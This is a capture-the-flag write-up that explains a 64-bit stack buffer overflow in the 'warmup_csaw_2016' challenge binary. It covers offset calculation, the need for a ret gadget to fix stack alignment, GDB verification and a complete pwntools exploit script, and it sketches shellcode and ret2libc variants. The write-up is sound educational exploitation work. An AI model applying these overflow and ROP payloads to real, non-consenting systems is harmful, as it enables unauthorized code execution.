# DASCTF — Pwn: `warmup_csaw_2016`

**Category:** Pwn (Binary Exploitation)
**Difficulty:** Easy
**Author:** Gantosay

---

## TL;DR

A classic 64-bit stack buffer overflow where the binary is kind enough to leak the address
of its own `system()` wrapper at runtime. The only real obstacle isn't finding the
vulnerability — it's getting past a **stack misalignment crash** inside `system()` caused by
modern glibc's SSE instructions. This write-up walks through static analysis, exploit
construction, and a full GDB-driven proof of the alignment issue — not just "add a `ret`
gadget and hope," but *why* it's needed and *how to verify it empirically*.

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       disabled (stack executable, GNU_STACK missing)
PIE:      No PIE (0x400000)
```

---

## 1. Static Recon

```bash
file ./csaw
pwn checksec ./csaw
objdump -d -M intel ./csaw
```

Four things stand out immediately from `checksec`:

| Protection | Status | Consequence |
|---|---|---|
| Canary | ❌ None | Overflow doesn't need a canary bypass |
| NX | ❌ Off | Stack is executable — shellcode injection is *also* viable, not just ret2func |
| PIE | ❌ Off | All addresses are static — `0x400000` base every run |
| RELRO | Partial | Not relevant to this exploit path |

With no canary and no PIE, this is about as forgiving as pwn gets. The interesting part is
everything that happens *after* the overflow lands.

---

## 2. Disassembly Walkthrough

### 2.1 The "freebie" function

```asm
40060d:  push   rbp
40060e:  mov    rbp, rsp
400611:  mov    edi, 0x400734      ; "cat flag.txt"
400616:  call   system@plt
40061b:  pop    rbp
40061c:  ret
```

An orphan function at `0x40060d` that nobody calls — it just sits in the binary, fully
formed, ready to call `system("cat flag.txt")`. This is the hijack target. Note: unlike the
more common `system("/bin/sh")` pattern, this challenge calls `system()` with a hardcoded
`cat flag.txt` command — there's no interactive shell to catch, just output to read.

### 2.2 `main()`

```asm
40061d:  push   rbp
40061e:  mov    rbp, rsp
400621:  add    rsp, -0x80          ; 128 bytes of locals

; write(1, "-Warm Up-", 10)
; write(1, "WOW:",     4)

40064d:  lea    rax, [rbp-0x80]
400651:  mov    edx, 0x40060d       ; the vuln function's own address...
400656:  mov    esi, 0x400751       ; format string
40065b:  mov    rdi, rax
40065e:  mov    eax, 0x0
400663:  call   sprintf@plt         ; sprintf(buf, "%p", 0x40060d)

; write(1, buf, 9)                 ; ...leaked straight to stdout
; write(1, ">", 1)

400692:  lea    rax, [rbp-0x40]     ; gets() target buffer
400696:  mov    rdi, rax
400699:  mov    eax, 0x0
40069e:  call   gets@plt            ; <-- the vulnerability
4006a3:  leave
4006a4:  ret
```

Two details matter here:

1. **The leak is free.** The binary itself prints `WOW:0x40060d` before taking input. Since
   PIE is off this leak is redundant for exploitation (the address is static anyway), but it
   does confirm the hijack target without needing to read the disassembly at all.
2. **The vulnerable buffer sits at `rbp-0x40`**, while `gets()` has no length limit. Classic
   unbounded read into a fixed-size stack buffer.

---

## 3. Finding the Offset

Rather than trust the arithmetic blindly, the offset was verified empirically with a
De Bruijn-style cyclic pattern sent through GDB, confirming the crash lands exactly where
the math predicts:

```
saved rbp is at buf + 0x40  → 64 bytes
+ 8 bytes for saved rbp itself
= 72 bytes of padding before the return address
```

Stack layout:

```
[ buf (64 bytes) ][ saved rbp (8 bytes) ][ return address (8 bytes) ]
 <-------- 72 bytes padding ----------->  <----- overwrite target ---->
```

---

## 4. The Real Obstacle: Stack Alignment

This is the part worth lingering on, because it's the kind of bug that silently eats hours
if you don't understand *why* it happens.

### 4.1 The symptom

A naive payload:

```python
payload = b'A' * 72 + p64(0x40060d)
```

...crashes. Not on our overwritten address — the crash happens *inside* `system()`,
specifically on an SSE instruction (`movaps` or similar), which faults with a general
protection exception if its memory operand isn't 16-byte aligned.

### 4.2 Why

x86-64 System V ABI guarantees that **at the point of a `call` instruction, `rsp` is a
multiple of 16.** `call` then pushes an 8-byte return address, so **on entry to any function,
`rsp ≡ 8 (mod 16)`** — a deliberate "off-by-8" that gets corrected by the callee's own
`push rbp` (another 8 bytes), bringing `rsp` back to a 16-byte boundary for the rest of the
function body.

Modern glibc (roughly glibc ≥ 2.27, i.e. Ubuntu 18.04 and later) uses SSE instructions in
hot paths inside functions like `system()`/`exit()`, which *require* this alignment
invariant to hold. They are not defensive about it — if it's violated, they fault.

Our exploit doesn't reach `0x40060d` via a real `call`. It reaches it via `ret` popping an
attacker-controlled value off the stack. Depending on how many pushes/pops happened along
the way (here, specifically the `leave` in `main()`'s own epilogue), the parity of `rsp`
relative to 16 can end up wrong by exactly 8 bytes — enough to desync every function we jump
into afterward.

### 4.3 The fix

A single-instruction `ret` gadget, executed *before* jumping to the real target, consumes
exactly 8 bytes off the stack and nothing else — pure parity correction with zero side
effects:

```asm
400720: repz ret
```

```python
payload = b'A' * 72 + p64(0x400720) + p64(0x40060d)
```

> **Why not two `ret` gadgets?** Each `ret` pops 8 bytes. Two gadgets pop 16 bytes total —
> which is itself a multiple of 16, so the net effect on parity is *zero*. If one gadget
> fixes the misalignment, two gadgets undo the fix. This was verified in practice, not just
> asserted.

### 4.4 Empirical proof via GDB

Setting a breakpoint directly on the `call system@plt` instruction and sending the full
payload confirms the fix:

```
pwndbg> break *0x400616
pwndbg> run < payload.bin
...
RSP  0x7fffffffe100
RDI  0x400734 ◂— ... /* 'cat flag.txt' */
```

`0x7fffffffe100` is exactly a multiple of `0x10` — `rsp` is correctly aligned right before
the `call`, exactly as required. `continue`-ing from here shows `system()` successfully
`vfork()`-ing into `/bin/sh` (`dash` on Ubuntu) to run `cat flag.txt`, with no segfault.

Without the `ret` gadget, the same breakpoint-and-inspect process shows a misaligned `rsp`
and a fault inside `system()` instead — confirming the root cause rather than just
papering over the crash.

---

## 5. Final Exploit

```python
from pwn import *

context.arch = 'amd64'

# p = process('./csaw')
p = remote('<host>', <port>)

PADDING     = 72
RET_GADGET  = 0x400720   # bare `ret` — fixes stack parity before the real call
TARGET_FUNC = 0x40060d   # system("cat flag.txt")

payload = b'A' * PADDING + p64(RET_GADGET) + p64(TARGET_FUNC)

p.recvuntil(b'>')
p.sendline(payload)
p.interactive()
```

Running it against the remote service returns the contents of `flag.txt` directly — no
shell interaction needed, since the hijacked function calls `cat` for us.

---

## 6. What I'd Change With NX Enabled

This binary's stack is executable and there's a ready-made `system()` call sitting in the
binary, which makes this about as easy as ret2-anything gets. Worth noting for future
reference what the *harder* version of this exploit looks like, since real-world binaries
essentially never ship with NX off:

- **Shellcode injection** only works here *because* `NX` is off — overwrite the return
  address with the address of the buffer itself and drop `shellcraft.sh()` into it. Not
  viable the moment NX is on.
- **ROP to `system("/bin/sh")` with a controlled argument** is the technique that
  generalizes: locate a `pop rdi; ret` gadget, point `rdi` at a `"/bin/sh"` string (found in
  the binary, written to `.bss`, or borrowed from libc), and chain into `system@plt` —
  the same stack-alignment rule from Section 4 still applies to the final `call`. If no
  usable `/bin/sh`-calling gadget chain exists locally, this turns into a **ret2libc**: leak
  a libc address through a `write`/`puts` call, compute the libc base, and chain into
  `system()` inside libc itself.

---

## Key Takeaways

- `checksec` output isn't just a checklist — "no canary, no PIE, no NX" together mean the
  overflow offset, the hijack target, and the crash surface are all static and reachable
  with zero bypasses needed except alignment.
- **Stack alignment bugs are an ABI-level invariant, not a glibc quirk.** Any payload that
  reaches a function via `ret` instead of `call` needs its parity checked — this applies to
  ret2win, ret2libc, and ROP chains alike.
- Verifying a crash theory in GDB (breakpoint at the exact `call`, inspect `rsp` before and
  after the fix) is strictly more convincing than "add a gadget because a write-up said so."

---
